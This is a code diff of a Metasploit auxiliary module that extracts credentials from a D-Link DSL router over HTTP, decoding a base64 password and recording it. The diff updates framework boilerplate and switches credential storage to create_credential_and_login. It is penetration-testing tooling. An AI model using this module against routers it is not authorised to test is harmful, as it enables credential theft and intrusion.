@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -22,8 +19,7 @@ class Metasploit3 < Msf::Auxiliary
         [
           [ 'EDB', '25252' ],
           [ 'OSVDB', '93013' ],
-          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-018' ],
-          [ 'URL', 'http://www.dlink.com/de/de/home-solutions/connect/modems-and-gateways/dsl-320b-adsl-2-ethernet-modem' ],
+          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-018' ]
         ],
       'Author'      => [
         'Michael Messner <devnull[at]s3cur1ty.de>'
@@ -69,14 +65,18 @@ class Metasploit3 < Msf::Auxiliary
             pass = $1
             pass = Rex::Text.decode_base64(pass)
             print_good("#{rhost}:#{rport} - Credentials found: #{user} / #{pass}")
-            report_auth_info(
-              :host => rhost,
-              :port => rport,
-              :sname => 'http',
-              :user => user,
-              :pass => pass,
-              :active => true
-            )
+
+            connection_details = {
+                module_fullname: self.fullname,
+                username: user,
+                private_data: pass,
+                private_type: :password,
+                workspace_id: myworkspace_id,
+                proof: line,
+                status: Metasploit::Model::Login::Status::UNTRIED
+            }.merge(service_details)
+            create_credential_and_login(connection_details)
+
           end
         end
       end
